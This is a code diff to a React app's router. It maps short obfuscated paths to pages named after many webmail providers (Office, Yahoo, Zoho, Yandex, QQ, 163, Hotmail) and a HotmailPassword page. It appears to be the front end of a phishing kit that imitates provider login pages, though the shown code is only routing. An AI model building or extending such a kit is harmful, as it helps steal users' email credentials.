@@ -36,30 +36,42 @@ function App() {
   const [page, setPage] = useState({
     office: "ofc",
     yahoo: "yh",
+    rackspace: "rsp",
+    hiworks: "hw",
+    godaddy: "gdy",
+    mail: "ml",
+    zoho: "zh",
+    yandex: "yx",
+    qq: "qaq",
+    hinet: "hnt",
+    263: "p263",
+    126: "p126",
+    163: "p163",
+    webmail: "wbm",
   });
 
   return (
-    <AppContext.Provider value={{page, setPage}}>
+    <AppContext.Provider value={{ page, setPage }}>
       <Router>
         <Redirect default />
         <HomeRedirect path="/" />
         <Encryption path="/enc" />
-        <Page163 path="/p163" />
-        <Page126 path="/p126" />
-        <Hinet path="/hnt" />
-        <Qq path="/qaq" />
-        <Page263 path="p263" />
-        <Godaddy path="gdy" />
-        <Hiworks path="hw" />
-        <Mail path="ml" />
-        <Office path={page.office} />
-        <Rackspace path="rsp" />
-        <WebmailMain path="wb" />
+        <Page163 path={page[163]} />
+        <Page126 path={page[126]} />
+        <Hinet path={page.hinet} />
+        <Qq path={page.qq} />
+        <Page263 path={page[263]} />
+        <Godaddy path={page.godaddy} />
+        <Hiworks path={page.hiworks} />
+        <Mail path={page.mail} />
+        <Office path="ofc" />
+        <Rackspace path={page.rackspace} />
+        <WebmailMain path={page.webmail} />
         <Yahoo path={page.yahoo} />
-        <Yandex path="yx" />
-        <Zoho path="zh" />
+        <Yandex path={page.yandex} />
+        <Zoho path={page.zoho} />
         <Hotmail path="ht" />
-        <HotmailPassword path="ht/:key" />
+        <HotmailPassword path={page.office} />
         <RedirectNorecord path="/gm" />
         <Processing path="processing" />
         <Portal path="portal" />
